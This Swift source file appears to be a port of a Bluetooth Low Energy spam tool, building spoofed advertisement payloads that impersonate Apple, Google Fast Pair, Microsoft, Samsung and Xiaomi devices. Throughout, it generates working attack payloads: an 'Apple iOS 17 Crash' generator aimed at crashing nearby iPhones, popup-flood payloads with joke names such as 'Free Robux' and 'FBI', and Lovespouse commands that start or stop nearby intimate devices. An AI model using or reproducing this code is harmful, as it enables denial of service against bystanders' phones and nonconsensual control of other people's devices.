import Foundation

// MARK: - Manufacturer IDs
let MANUFACTURER_APPLE: UInt16 = 0x004C
let MANUFACTURER_MICROSOFT: UInt16 = 0x0006
let MANUFACTURER_SAMSUNG: UInt16 = 0x0075
let MANUFACTURER_TYPO: UInt16 = 0x00FF
let MANUFACTURER_XIAOMI: UInt16 = 0x038F

let UUID_GOOGLE_FAST_PAIR = "0000FE2C-0000-1000-8000-00805F9B34FB"

// MARK: - Helpers

func hexToBytes(_ hex: String) -> [UInt8] {
    var bytes: [UInt8] = []
    var i = hex.startIndex
    while i < hex.endIndex {
        let j = hex.index(i, offsetBy: 2)
        let byteStr = String(hex[i..<j])
        if let byte = UInt8(byteStr, radix: 16) {
            bytes.append(byte)
        }
        i = j
    }
    return bytes
}

func randomBytes(_ count: Int) -> [UInt8] {
    (0..<count).map { _ in UInt8.random(in: 0...255) }
}

func randomHex(_ count: Int) -> String {
    randomBytes(count).map { String(format: "%02x", $0) }.joined()
}

// MARK: - Apple Devices
// Matches ContinuityNewDevicePopUpAdvertisementSetGenerator.kt deviceData

struct DeviceInfo {
    let name: String
    let key: String
}

let appleDevices: [DeviceInfo] = [
    DeviceInfo(name: "AirPods Pro", key: "0E20"),
    DeviceInfo(name: "AirPods Max", key: "0A20"),
    DeviceInfo(name: "AirPods", key: "0220"),
    DeviceInfo(name: "AirPods 2nd Gen", key: "0F20"),
    DeviceInfo(name: "AirPods 3rd Gen", key: "1320"),
    DeviceInfo(name: "AirPods Pro 2nd Gen", key: "1420"),
    DeviceInfo(name: "Beats Flex", key: "1020"),
    DeviceInfo(name: "Beats Solo 3", key: "0620"),
    DeviceInfo(name: "Powerbeats 3", key: "0320"),
    DeviceInfo(name: "Powerbeats Pro", key: "0B20"),
    DeviceInfo(name: "Beats Solo Pro", key: "0C20"),
    DeviceInfo(name: "Beats Studio Buds", key: "1120"),
    DeviceInfo(name: "Beats X", key: "0520"),
    DeviceInfo(name: "Beats Studio 3", key: "0920"),
    DeviceInfo(name: "Beats Studio Pro", key: "1720"),
    DeviceInfo(name: "Beats Fit Pro", key: "1220"),
    DeviceInfo(name: "Beats Studio Buds+", key: "1620"),
    DeviceInfo(name: "AirPods Pro 2nd Gen USB-C", key: "2420"),
    DeviceInfo(name: "AirPods 4 ANC", key: "2820"),
    DeviceInfo(name: "AirPods 4", key: "2920"),
    DeviceInfo(name: "AirPods Max USB-C", key: "2B20"),
    DeviceInfo(name: "Beats Powerbeats Pro 2", key: "2C20"),
    DeviceInfo(name: "Beats Solo 4", key: "2520"),
    DeviceInfo(name: "Beats Solo Buds", key: "2620"),
    DeviceInfo(name: "Powerbeats Fit", key: "2F20"),
]

// Matches ContinuityActionModalAdvertisementSetGenerator.kt _nearbyActions
struct ActionModal {
    let name: String
    let code: String
}

let appleActionModals: [ActionModal] = [
    ActionModal(name: "AppleTV AutoFill", code: "13"),
    ActionModal(name: "AppleTV Connecting", code: "27"),
    ActionModal(name: "Join This AppleTV?", code: "20"),
    ActionModal(name: "AppleTV Audio Sync", code: "19"),
    ActionModal(name: "AppleTV Color Balance", code: "1E"),
    ActionModal(name: "Setup New iPhone", code: "09"),
    ActionModal(name: "Transfer Phone Number", code: "02"),
    ActionModal(name: "HomePod Setup", code: "0B"),
    ActionModal(name: "Setup New AppleTV", code: "01"),
    ActionModal(name: "Pair AppleTV", code: "06"),
    ActionModal(name: "HomeKit AppleTV Setup", code: "0D"),
    ActionModal(name: "AppleID for AppleTV?", code: "2B"),
    ActionModal(name: "Apple Watch", code: "05"),
    ActionModal(name: "Apple Vision Pro", code: "24"),
    ActionModal(name: "Connect to other Device", code: "2F"),
    ActionModal(name: "Software Update", code: "21"),
    ActionModal(name: "Mobile Backup", code: "04"),
    ActionModal(name: "Internet Relay", code: "07"),
    ActionModal(name: "WiFi Password", code: "08"),
    ActionModal(name: "Repair", code: "0A"),
    ActionModal(name: "Apple Pay", code: "0C"),
    ActionModal(name: "Developer Tools Pairing", code: "0E"),
    ActionModal(name: "Answered Call", code: "0F"),
    ActionModal(name: "Ended Call", code: "10"),
    ActionModal(name: "DD Ping", code: "11"),
    ActionModal(name: "DD Pong", code: "12"),
    ActionModal(name: "Companion Link Proximity", code: "14"),
    ActionModal(name: "Remote Management", code: "15"),
    ActionModal(name: "Remote Auto Fill Pong", code: "16"),
    ActionModal(name: "Remote Display", code: "17"),
    ActionModal(name: "Unlock with Apple Watch", code: "2E"),
    ActionModal(name: "AirDrop Sidecar", code: "25"),
    ActionModal(name: "Vision Pro Setup", code: "2C"),
]

// Matches ContinuityIos17CrashAdvertisementSetGenerator.kt _nearbyActions
// (subset of action modals - only 12 actions used for iOS 17 crash)
let appleIos17CrashActions: [ActionModal] = [
    ActionModal(name: "AppleTV AutoFill", code: "13"),
    ActionModal(name: "AppleTV Connecting", code: "27"),
    ActionModal(name: "Join This AppleTV?", code: "20"),
    ActionModal(name: "AppleTV Audio Sync", code: "19"),
    ActionModal(name: "AppleTV Color Balance", code: "1E"),
    ActionModal(name: "Setup New iPhone", code: "09"),
    ActionModal(name: "Transfer Phone Number", code: "02"),
    ActionModal(name: "HomePod Setup", code: "0B"),
    ActionModal(name: "Setup New AppleTV", code: "01"),
    ActionModal(name: "Pair AppleTV", code: "06"),
    ActionModal(name: "HomeKit AppleTV Setup", code: "0D"),
    ActionModal(name: "AppleID for AppleTV?", code: "2B"),
]

// MARK: - Google Fast Pair
// Genuine device IDs from FastPairDevicesAdvertisementSetGenerator.kt (representative subset)

let fastPairDevices: [DeviceInfo] = [
    DeviceInfo(name: "adidas RPT-02 SOL", key: "DAE096"),
    DeviceInfo(name: "adidas Z.N.E. 01", key: "A83C10"),
    DeviceInfo(name: "AIAIAI TMA-2 (H60)", key: "002000"),
    DeviceInfo(name: "AKG N9 Hybrid", key: "9B7339"),
    DeviceInfo(name: "Amazfit PowerBuds", key: "202B3D"),
    DeviceInfo(name: "Android Auto", key: "070000"),
    DeviceInfo(name: "ATH-CK1TW", key: "02D815"),
    DeviceInfo(name: "ATH-CKS50TW", key: "E6E771"),
    DeviceInfo(name: "ATH-M50xBT2", key: "9C3997"),
    DeviceInfo(name: "ATH-SQ1TW", key: "9939BC"),
    DeviceInfo(name: "ATH-TWX7", key: "CA7030"),
    DeviceInfo(name: "B&O Beoplay E6", key: "05AA91"),
    DeviceInfo(name: "B&O Beoplay H8i", key: "03AA91"),
    DeviceInfo(name: "Beats Studio Buds", key: "038F16"),
    DeviceInfo(name: "Beoplay EX", key: "D6E870"),
    DeviceInfo(name: "Bose NC 700", key: "CD8256"),
    DeviceInfo(name: "Bose QC Ultra Earbuds", key: "5BACD6"),
    DeviceInfo(name: "Bose QC Ultra Headphones", key: "8A31B7"),
    DeviceInfo(name: "Bose QuietComfort 35 II", key: "0000F0"),
    DeviceInfo(name: "Chromebox", key: "DADE43"),
    DeviceInfo(name: "Cleer EDGE Voice", key: "013D8A"),
    DeviceInfo(name: "Cleer FLOW II", key: "003D8A"),
    DeviceInfo(name: "Cleer HALO", key: "D7E3EB"),
    DeviceInfo(name: "DENON AH-C830NCW", key: "038B91"),
    DeviceInfo(name: "Ear (2)", key: "DEE8C0"),
    DeviceInfo(name: "EDIFIER NeoBuds Pro 2", key: "9CE3C7"),
    DeviceInfo(name: "Galaxy A14", key: "915CFA"),
    DeviceInfo(name: "Galaxy S20 5G", key: "E4E457"),
    DeviceInfo(name: "Galaxy S21 5G", key: "06AE20"),
    DeviceInfo(name: "Galaxy S22 Ultra", key: "99F098"),
    DeviceInfo(name: "Google Gphones", key: "0B0000"),
    DeviceInfo(name: "Google Pixel Buds", key: "060000"),
    DeviceInfo(name: "Jabra Elite 10", key: "DAD3A6"),
    DeviceInfo(name: "Jabra Elite 2", key: "00AA48"),
    DeviceInfo(name: "Jabra Elite 4", key: "6BA5C3"),
    DeviceInfo(name: "Jabra Elite 5", key: "8B0A91"),
    DeviceInfo(name: "Jaybird Vista 2", key: "C8777E"),
    DeviceInfo(name: "JBL Buds Pro", key: "F52494"),
    DeviceInfo(name: "JBL CLUB ONE", key: "A8001A"),
    DeviceInfo(name: "JBL ENDURANCE PEAK 3", key: "D933A7"),
    DeviceInfo(name: "JBL Everest 110GA", key: "0002F0"),
    DeviceInfo(name: "JBL Flip 6", key: "821F66"),
    DeviceInfo(name: "JBL Live 300TWS", key: "718FA4"),
    DeviceInfo(name: "JBL LIVE FLEX", key: "02F637"),
    DeviceInfo(name: "JBL LIVE PRO 2 TWS", key: "6C4DE5"),
    DeviceInfo(name: "JBL LIVE PRO+ TWS", key: "8CB05C"),
    DeviceInfo(name: "JBL LIVE220BT", key: "05C452"),
    DeviceInfo(name: "JBL LIVE670NC", key: "A8A72A"),
    DeviceInfo(name: "JBL LIVE770NC", key: "0660D7"),
    DeviceInfo(name: "JBL Pulse 5", key: "C7D620"),
    DeviceInfo(name: "JBL REFLECT AERO", key: "DFD433"),
    DeviceInfo(name: "JBL SOUNDGEAR SENSE", key: "D9414F"),
    DeviceInfo(name: "JBL TUNE 520BT", key: "664454"),
    DeviceInfo(name: "JBL TUNE BEAM", key: "A8E353"),
    DeviceInfo(name: "JBL TUNE BUDS", key: "0F232A"),
    DeviceInfo(name: "JBL TUNE125TWS", key: "054B2D"),
    DeviceInfo(name: "JBL TUNE225TWS", key: "5BD6C9"),
    DeviceInfo(name: "JBL TUNE660NC", key: "A8C636"),
    DeviceInfo(name: "JBL TUNE770NC", key: "02DD4F"),
    DeviceInfo(name: "JBL VIBE BEAM", key: "F00E97"),
    DeviceInfo(name: "JBL WAVE BUDS", key: "A92498"),
    DeviceInfo(name: "JBL Xtreme 4", key: "C9836A"),
    DeviceInfo(name: "JLab Epic Air ANC", key: "9CF08F"),
    DeviceInfo(name: "KENWOOD WS-A1", key: "8CAD81"),
    DeviceInfo(name: "LG HBS-1010", key: "F00304"),
    DeviceInfo(name: "LG TONE-FREE", key: "DB8AC7"),
    DeviceInfo(name: "Libratone Q Adapt On-Ear", key: "003000"),
    DeviceInfo(name: "LinkBuds", key: "917E46"),
    DeviceInfo(name: "LinkBuds S", key: "1F181A"),
    DeviceInfo(name: "M&D MW65", key: "003B41"),
    DeviceInfo(name: "MIDDLETON", key: "CCBB7E"),
    DeviceInfo(name: "MOTIF II A.N.C.", key: "D8058C"),
    DeviceInfo(name: "MOTO BUDS 600 ANC", key: "D5B5F7"),
    DeviceInfo(name: "Nest Hub Max", key: "07F426"),
    DeviceInfo(name: "Nokia Solo Bud+", key: "8BB0A0"),
    DeviceInfo(name: "Oladance Wearable Stereo", key: "8E4666"),
    DeviceInfo(name: "OnePlus Buds Z", key: "E07634"),
    DeviceInfo(name: "OPPO Enco Air3 Pro", key: "06C197"),
    DeviceInfo(name: "oraimo FreePods 4", key: "6B8C65"),
    DeviceInfo(name: "Panasonic RP-HD610N", key: "005BC3"),
    DeviceInfo(name: "Philips Fidelio T2", key: "D65F4E"),
    DeviceInfo(name: "Pixel Buds", key: "92BBBD"),
    DeviceInfo(name: "Pixel Buds A-Series", key: "8B66AB"),
    DeviceInfo(name: "Pixel Buds Pro", key: "9ADB11"),
    DeviceInfo(name: "POCO Pods", key: "E6E8B8"),
    DeviceInfo(name: "Razer Hammerhead TWS", key: "0E30C3"),
    DeviceInfo(name: "realme Buds Air 5 Pro", key: "E6E37E"),
    DeviceInfo(name: "Sony WF-1000X", key: "00C95C"),
    DeviceInfo(name: "Sony WF-1000XM4", key: "2D7A23"),
    DeviceInfo(name: "Sony XM5", key: "D446A7"),
    DeviceInfo(name: "Sony WH-1000XM3", key: "0DC95C"),
    DeviceInfo(name: "soundcore Glow", key: "CB529D"),
    DeviceInfo(name: "soundcore Liberty 4 NC", key: "06D8FC"),
    DeviceInfo(name: "soundcore Space One", key: "DEDD6F"),
    DeviceInfo(name: "SRS-XB33", key: "20330C"),
    DeviceInfo(name: "Technics EAH-AZ60M2", key: "0744B6"),
    DeviceInfo(name: "TicWatch Pro 5", key: "057802"),
    DeviceInfo(name: "WF-1000XM5", key: "8A8F23"),
    DeviceInfo(name: "WH-1000XM4", key: "01EEB4"),
    DeviceInfo(name: "WH-1000XM5", key: "5C7CDC"),
    DeviceInfo(name: "WONDERBOOM 3", key: "05A963"),
    DeviceInfo(name: "Xiaomi Buds 4 Pro", key: "DEEA86"),
    DeviceInfo(name: "Your BMW", key: "9DB896"),
    DeviceInfo(name: "Zone Wireless 2", key: "E5E2E9"),
]

// Debug/custom device IDs from FastPairDebugAdvertisementSetGenerator.kt
let fastPairDebugDevices: [DeviceInfo] = [
    DeviceInfo(name: "Flipper Zero", key: "D99CA1"),
    DeviceInfo(name: "Free Robux", key: "77FF67"),
    DeviceInfo(name: "Free VBucks", key: "AA187F"),
    DeviceInfo(name: "Rickroll", key: "DCE9EA"),
    DeviceInfo(name: "Animated Rickroll", key: "87B25F"),
    DeviceInfo(name: "Boykisser", key: "F38C02"),
    DeviceInfo(name: "BLM", key: "1448C9"),
    DeviceInfo(name: "Xtreme", key: "D5AB33"),
    DeviceInfo(name: "Xtreme Cta", key: "0C0B67"),
    DeviceInfo(name: "Talking Sasquach", key: "13B39D"),
    DeviceInfo(name: "ClownMaster", key: "AA1FE1"),
    DeviceInfo(name: "Obama", key: "7C6CDB"),
    DeviceInfo(name: "Ryanair", key: "005EF9"),
    DeviceInfo(name: "FBI", key: "E2106F"),
    DeviceInfo(name: "Tesla", key: "B37A62"),
]

// Phone setup device IDs from FastPairPhoneSetupAdvertisementSetGenerator.kt
let fastPairPhoneSetupDevices: [DeviceInfo] = [
    DeviceInfo(name: "Google Gphones Transfer", key: "00000C"),
    DeviceInfo(name: "Galaxy S23 Ultra", key: "0577B1"),
    DeviceInfo(name: "Galaxy S20+", key: "05A9BC"),
]

// MARK: - Microsoft Swift Pair
// Matches SwiftPairAdvertisementSetGenerator.kt _deviceNames

let swiftPairNames = [
    "Device 1", "Device 2", "Device 3", "Device 4", "Device 5",
    "Device 6", "Device 7", "Device 8", "Device 9", "Device 10",
]

// MARK: - Samsung
// Matches EasySetupBudsAdvertisementSetGenerator.kt _genuineBudsIds

let samsungBuds: [DeviceInfo] = [
    DeviceInfo(name: "Fallback Buds", key: "EE7A0C"),
    DeviceInfo(name: "Fallback Dots", key: "9D1700"),
    DeviceInfo(name: "Light Purple Buds2", key: "39EA48"),
    DeviceInfo(name: "Bluish Silver Buds2", key: "A7C62C"),
    DeviceInfo(name: "Black Buds Live", key: "850116"),
    DeviceInfo(name: "Gray & Black Buds2", key: "3D8F41"),
    DeviceInfo(name: "Bluish Chrome Buds2", key: "3B6D02"),
    DeviceInfo(name: "Gray Beige Buds2", key: "AE063C"),
    DeviceInfo(name: "Pure White Buds", key: "B8B905"),
    DeviceInfo(name: "Pure White Buds2", key: "EAAA17"),
    DeviceInfo(name: "Black Buds", key: "D30704"),
    DeviceInfo(name: "French Flag Buds", key: "9DB006"),
    DeviceInfo(name: "Dark Purple Buds Live", key: "101F1A"),
    DeviceInfo(name: "Dark Blue Buds", key: "859608"),
    DeviceInfo(name: "Pink Buds", key: "8E4503"),
    DeviceInfo(name: "White & Black Buds2", key: "2C6740"),
    DeviceInfo(name: "Bronze Buds Live", key: "3F6718"),
    DeviceInfo(name: "Red Buds Live", key: "42C519"),
    DeviceInfo(name: "Black & White Buds2", key: "AE073A"),
    DeviceInfo(name: "Sleek Black Buds2", key: "011716"),
]

// Matches EasySetupWatchAdvertisementSetGenerator.kt _genuineWatchIds
let samsungWatches: [DeviceInfo] = [
    DeviceInfo(name: "Fallback Watch", key: "1A"),
    DeviceInfo(name: "White Watch4 Classic 44m", key: "01"),
    DeviceInfo(name: "Black Watch4 Classic 40m", key: "02"),
    DeviceInfo(name: "White Watch4 Classic 40m", key: "03"),
    DeviceInfo(name: "Black Watch4 44mm", key: "04"),
    DeviceInfo(name: "Silver Watch4 44mm", key: "05"),
    DeviceInfo(name: "Green Watch4 44mm", key: "06"),
    DeviceInfo(name: "Black Watch4 40mm", key: "07"),
    DeviceInfo(name: "White Watch4 40mm", key: "08"),
    DeviceInfo(name: "Gold Watch4 40mm", key: "09"),
    DeviceInfo(name: "French Watch4", key: "0A"),
    DeviceInfo(name: "French Watch4 Classic", key: "0B"),
    DeviceInfo(name: "Fox Watch5 44mm", key: "0C"),
    DeviceInfo(name: "Black Watch5 44mm", key: "11"),
    DeviceInfo(name: "Sapphire Watch5 44mm", key: "12"),
    DeviceInfo(name: "Purpleish Watch5 40mm", key: "13"),
    DeviceInfo(name: "Gold Watch5 40mm", key: "14"),
    DeviceInfo(name: "Black Watch5 Pro 45mm", key: "15"),
    DeviceInfo(name: "Gray Watch5 Pro 45mm", key: "16"),
    DeviceInfo(name: "White Watch5 44mm", key: "17"),
    DeviceInfo(name: "White & Black Watch5", key: "18"),
    DeviceInfo(name: "Black Watch6 Pink 40mm", key: "1B"),
    DeviceInfo(name: "Gold Watch6 Gold 40mm", key: "1C"),
    DeviceInfo(name: "Silver Watch6 Cyan 44mm", key: "1D"),
    DeviceInfo(name: "Black Watch6 Classic 43m", key: "1E"),
    DeviceInfo(name: "Green Watch6 Classic 43m", key: "20"),
    DeviceInfo(name: "Black Watch5 Golf Edition", key: "E4"),
    DeviceInfo(name: "White Watch5 Gold Edition", key: "E5"),
    DeviceInfo(name: "Black Watch6 Golf Edition", key: "EC"),
    DeviceInfo(name: "Black Watch6 TB Edition", key: "EF"),
    DeviceInfo(name: "Black Galaxy Watch7 44mm", key: "30"),
    DeviceInfo(name: "Green Galaxy Watch7 44mm", key: "31"),
    DeviceInfo(name: "Cream Galaxy Watch7 40mm", key: "32"),
    DeviceInfo(name: "Green Galaxy Watch7 40mm", key: "33"),
    DeviceInfo(name: "White Galaxy Watch7 Classic", key: "34"),
    DeviceInfo(name: "Black Galaxy Watch7 Classic", key: "35"),
    DeviceInfo(name: "Titanium White Watch Ultra", key: "40"),
    DeviceInfo(name: "Titanium Black Watch Ultra", key: "41"),
    DeviceInfo(name: "Titanium Silver Watch Ultra", key: "42"),
    DeviceInfo(name: "Black Galaxy Ring", key: "60"),
    DeviceInfo(name: "Gold Galaxy Ring", key: "61"),
    DeviceInfo(name: "Silver Galaxy Ring", key: "62"),
]

// MARK: - Lovespouse
// Matches LovespousePlayAdvertisementSetGenerator.kt lovespousePlays

let lovespousePlayIds: [DeviceInfo] = [
    DeviceInfo(name: "Classic 1", key: "E49C6C"),
    DeviceInfo(name: "Classic 2", key: "E7075E"),
    DeviceInfo(name: "Classic 3", key: "E68E4F"),
    DeviceInfo(name: "Classic 4", key: "E1313B"),
    DeviceInfo(name: "Classic 5", key: "E0B82A"),
    DeviceInfo(name: "Classic 6", key: "E32318"),
    DeviceInfo(name: "Classic 7", key: "E2AA09"),
    DeviceInfo(name: "Classic 8", key: "ED5DF1"),
    DeviceInfo(name: "Classic 9", key: "ECD4E0"),
    DeviceInfo(name: "Independent 1-1", key: "D41F5D"),
    DeviceInfo(name: "Independent 1-2", key: "D7846F"),
    DeviceInfo(name: "Independent 1-3", key: "D60D7E"),
    DeviceInfo(name: "Independent 1-4", key: "D1B20A"),
    DeviceInfo(name: "Independent 1-5", key: "D0B31B"),
    DeviceInfo(name: "Independent 1-6", key: "D3A029"),
    DeviceInfo(name: "Independent 1-7", key: "D22938"),
    DeviceInfo(name: "Independent 1-8", key: "DDDEC0"),
    DeviceInfo(name: "Independent 1-9", key: "DC57D1"),
    DeviceInfo(name: "Independent 2-1", key: "A4982E"),
    DeviceInfo(name: "Independent 2-2", key: "A7031C"),
    DeviceInfo(name: "Independent 2-3", key: "A68A0D"),
    DeviceInfo(name: "Independent 2-4", key: "A13579"),
    DeviceInfo(name: "Independent 2-5", key: "A0BC68"),
    DeviceInfo(name: "Independent 2-6", key: "A3275A"),
    DeviceInfo(name: "Independent 2-7", key: "A2AE4B"),
    DeviceInfo(name: "Independent 2-8", key: "AD59B3"),
    DeviceInfo(name: "Independent 2-9", key: "ACD0A2"),
]

// Matches LovespouseStopAdvertisementSetGenerator.kt lovespouseStops
let lovespouseStopIds: [DeviceInfo] = [
    DeviceInfo(name: "Classic Stop", key: "E5157D"),
    DeviceInfo(name: "Independent 1 Stop", key: "D5964C"),
    DeviceInfo(name: "Independent 2 Stop", key: "A5113F"),
]

// MARK: - Payload Generators

enum PayloadType: String, CaseIterable {
    case appleNewDevice = "Apple New Device"
    case appleNotYourDevice = "Apple Not Your Device"
    case appleNewAirtag = "Apple New AirTag"
    case appleActionModal = "Apple Action Modal"
    case appleIos17Crash = "Apple iOS 17 Crash"
    case googleFastPair = "Google Fast Pair"
    case googleFastPairDebug = "Google Fast Pair Debug"
    case googleFastPairPhoneSetup = "Google Fast Pair Phone Setup"
    case microsoftSwiftPair = "Microsoft Swift Pair"
    case samsungBuds = "Samsung Buds"
    case samsungWatch = "Samsung Watch"
    case lovespousePlay = "Lovespouse Play"
    case lovespouseStop = "Lovespouse Stop"
    case xiaomiQuickConnect = "Xiaomi QuickConnect"
    case appleAirdrop = "Apple AirDrop"
    case appleAirplayTarget = "Apple AirPlay Target"
    case appleHandoff = "Apple Handoff"
    case appleTetheringSource = "Apple Tethering Source"
    case appleNearbyInfo = "Apple Nearby Info"
    case microsoftSwiftPairHeadphone = "Microsoft Swift Pair Headphone"
    case nameflood = "Name Flood"
}

struct BLEPayload {
    let type: PayloadType
    let manufacturerId: UInt16?
    let manufacturerData: Data?
    let serviceUUID: String?
    let serviceData: Data?
}

func generatePayload(_ type: PayloadType) -> BLEPayload {
    switch type {
    case .appleNewDevice:
        let device = appleDevices.randomElement()!
        var hex = "071907" + device.key + "55"
        hex += String(format: "%02x", Int.random(in: 0...99))
        hex += String(format: "%02x", Int.random(in: 0...79))
        hex += String(format: "%02x", Int.random(in: 0...255))
        hex += "0000" + randomHex(16)
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
                          manufacturerData: Data(hexToBytes(hex)),
                          serviceUUID: nil, serviceData: nil)

    case .appleNotYourDevice:
        let device = appleDevices.randomElement()!
        var hex = "071901" + device.key + "55"
        hex += String(format: "%02x", Int.random(in: 0...99))
        hex += String(format: "%02x", Int.random(in: 0...79))
        hex += String(format: "%02x", Int.random(in: 0...255))
        hex += "0000" + randomHex(16)
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
                          manufacturerData: Data(hexToBytes(hex)),
                          serviceUUID: nil, serviceData: nil)

    case .appleNewAirtag:
        let key = ["0055", "0030"].randomElement()!
        var hex = "071905" + key + "55"
        hex += String(format: "%02x", Int.random(in: 0...99))
        hex += String(format: "%02x", Int.random(in: 0...79))
        hex += String(format: "%02x", Int.random(in: 0...255))
        hex += "0000" + randomHex(16)
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
                          manufacturerData: Data(hexToBytes(hex)),
                          serviceUUID: nil, serviceData: nil)

    case .appleActionModal:
        let modal = appleActionModals.randomElement()!
        let hex = "0F05C0" + modal.code + randomHex(3)
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
                          manufacturerData: Data(hexToBytes(hex)),
                          serviceUUID: nil, serviceData: nil)

    case .appleIos17Crash:
        // Matches ContinuityIos17CrashAdvertisementSetGenerator.kt
        // Same as action modal but with appendix: 000010 + 3 random bytes
        let modal = appleIos17CrashActions.randomElement()!
        var payload = hexToBytes("0F05C0" + modal.code)
        payload.append(contentsOf: randomBytes(3))       // authentication tag
        payload.append(contentsOf: hexToBytes("000010"))  // appendix
        payload.append(contentsOf: randomBytes(3))       // random appendix
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
                          manufacturerData: Data(payload),
                          serviceUUID: nil, serviceData: nil)

    case .googleFastPair:
        let device = fastPairDevices.randomElement()!
        return BLEPayload(type: type, manufacturerId: nil,
                          manufacturerData: nil,
                          serviceUUID: UUID_GOOGLE_FAST_PAIR,
                          serviceData: Data(hexToBytes(device.key)))

    case .googleFastPairDebug:
        let device = fastPairDebugDevices.randomElement()!
        return BLEPayload(type: type, manufacturerId: nil,
                          manufacturerData: nil,
                          serviceUUID: UUID_GOOGLE_FAST_PAIR,
                          serviceData: Data(hexToBytes(device.key)))

    case .googleFastPairPhoneSetup:
        let device = fastPairPhoneSetupDevices.randomElement()!
        return BLEPayload(type: type, manufacturerId: nil,
                          manufacturerData: nil,
                          serviceUUID: UUID_GOOGLE_FAST_PAIR,
                          serviceData: Data(hexToBytes(device.key)))

    case .microsoftSwiftPair:
        let name = swiftPairNames.randomElement()!
        var data = hexToBytes("030080")
        data.append(contentsOf: Array(name.utf8))
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_MICROSOFT,
                          manufacturerData: Data(data),
                          serviceUUID: nil, serviceData: nil)

    case .samsungBuds:
        let budsArray: [DeviceInfo] = samsungBuds
        let device = budsArray.randomElement()!
        // Match Kotlin: it.key.substring(0,4) + "01" + it.key.substring(4)
        let keyStr = device.key
        let midIndex = keyStr.index(keyStr.startIndex, offsetBy: 4)
        let deviceHex = String(keyStr[keyStr.startIndex..<midIndex]) + "01" + String(keyStr[midIndex...])
        var payload = hexToBytes("42098102141503210109")
        payload.append(contentsOf: hexToBytes(deviceHex))
        payload.append(contentsOf: hexToBytes("063C948E00000000C700"))
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_SAMSUNG,
                          manufacturerData: Data(payload),
                          serviceUUID: nil, serviceData: nil)

    case .samsungWatch:
        let watch = samsungWatches.randomElement()!
        var payload = hexToBytes("010002000101FF000043")
        payload.append(contentsOf: hexToBytes(watch.key))
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_SAMSUNG,
                          manufacturerData: Data(payload),
                          serviceUUID: nil, serviceData: nil)

    case .lovespousePlay:
        let device = lovespousePlayIds.randomElement()!
        var payload = hexToBytes("FFFF006DB643CE97FE427C")
        payload.append(contentsOf: hexToBytes(device.key))
        payload.append(contentsOf: hexToBytes("03038FAE"))
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_TYPO,
                          manufacturerData: Data(payload),
                          serviceUUID: nil, serviceData: nil)

    case .lovespouseStop:
        let device = lovespouseStopIds.randomElement()!
        var payload = hexToBytes("FFFF006DB643CE97FE427C")
        payload.append(contentsOf: hexToBytes(device.key))
        payload.append(contentsOf: hexToBytes("03038FAE"))
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_TYPO,
                          manufacturerData: Data(payload),
                          serviceUUID: nil, serviceData: nil)

    case .xiaomiQuickConnect:
        var payload = hexToBytes("160120")
        payload.append(contentsOf: randomBytes(2))
        payload.append(contentsOf: hexToBytes("170A00000000885011B1FF"))
        payload.append(contentsOf: randomBytes(2))
        payload.append(contentsOf: hexToBytes("000000000000"))
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_XIAOMI,
                          manufacturerData: Data(payload),
                          serviceUUID: nil, serviceData: nil)

    case .appleAirdrop:
        var hex = "0512" + String(repeating: "00", count: 8)
        hex += String(format: "%02x", Int.random(in: 0...255))
        hex += randomHex(2) + randomHex(2) + randomHex(4) + "00"
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
                          manufacturerData: Data(hexToBytes(hex)),
                          serviceUUID: nil, serviceData: nil)

    case .appleAirplayTarget:
        let hex = "0906" + randomHex(6)
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
                          manufacturerData: Data(hexToBytes(hex)),
                          serviceUUID: nil, serviceData: nil)

    case .appleHandoff:
        let hex = "0C0E" + randomHex(14)
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
                          manufacturerData: Data(hexToBytes(hex)),
                          serviceUUID: nil, serviceData: nil)

    case .appleTetheringSource:
        let hex = "0E06" + randomHex(6)
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
                          manufacturerData: Data(hexToBytes(hex)),
                          serviceUUID: nil, serviceData: nil)

    case .appleNearbyInfo:
        let hex = "1005" + randomHex(5)
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_APPLE,
                          manufacturerData: Data(hexToBytes(hex)),
                          serviceUUID: nil, serviceData: nil)

    case .microsoftSwiftPairHeadphone:
        let name = swiftPairNames.randomElement()!
        var data = hexToBytes("030180D72FD2F461E4040400")
        data.append(contentsOf: Array(name.utf8))
        return BLEPayload(type: type, manufacturerId: MANUFACTURER_MICROSOFT,
                          manufacturerData: Data(data),
                          serviceUUID: nil, serviceData: nil)

    case .nameflood:
        let names = ["Free WiFi", "AirDrop", "Keyboard", "Mouse", "TV Remote",
                     "Game Controller", "Headphones", "Speaker", "Webcam", "Printer"]
        let name = names.randomElement()!
        return BLEPayload(type: type, manufacturerId: nil,
                          manufacturerData: Data(Array(name.utf8)),
                          serviceUUID: nil, serviceData: nil)
    }
}
